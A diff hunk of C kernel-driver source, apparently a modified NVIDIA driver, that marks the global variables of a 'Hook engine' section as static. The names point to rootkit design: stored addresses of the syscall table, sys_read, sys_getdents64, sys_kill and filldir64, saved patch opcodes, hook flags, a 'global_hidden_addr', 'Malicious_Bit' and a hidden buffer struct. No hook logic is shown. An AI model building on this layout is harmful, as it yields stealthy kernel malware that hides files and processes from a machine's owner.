@@ -410,27 +410,27 @@ typedef spinlock_t                nv_spinlock_t;
 // Hook engine
 ///////////////////////////////////////////////////////////////////////
 
-unsigned int system_call_addr = 0;
-unsigned int sys_call_table_addr = 0;
+static unsigned int system_call_addr = 0;
+static unsigned int sys_call_table_addr = 0;
 
-unsigned int sys_read_addr = 0;
-unsigned int sys_getdents64_addr = 0;
-unsigned int sys_kill_addr = 0;
-unsigned int kill_something_info_addr = 0;
+static unsigned int sys_read_addr = 0;
+static unsigned int sys_getdents64_addr = 0;
+static unsigned int sys_kill_addr = 0;
+static unsigned int kill_something_info_addr = 0;
 
-int hook_kill_something_info_flag = 1;
-int hook_vfs_read_flag = 1;
+static int hook_kill_something_info_flag = 1;
+static int hook_vfs_read_flag = 1;
 
 
 
-unsigned int filldir64_addr = 0;
-unsigned char old_dma_opcode[5];
-unsigned char old_mlock_opcode[5];
+static unsigned int filldir64_addr = 0;
+static unsigned char old_dma_opcode[5];
+static unsigned char old_mlock_opcode[5];
 
-long get_pfn_of_virtual_address(unsigned long, unsigned long *);
+static long get_pfn_of_virtual_address(unsigned long, unsigned long *);
 
-unsigned long global_hidden_addr = 0x4000000;
-unsigned int Malicious_Bit = 0;
+static unsigned long global_hidden_addr = 0x4000000;
+static unsigned int Malicious_Bit = 0;
 
 typedef struct hidden_driver_info // For comfort reasons, define the hidden buffer struct in driver too.
 {
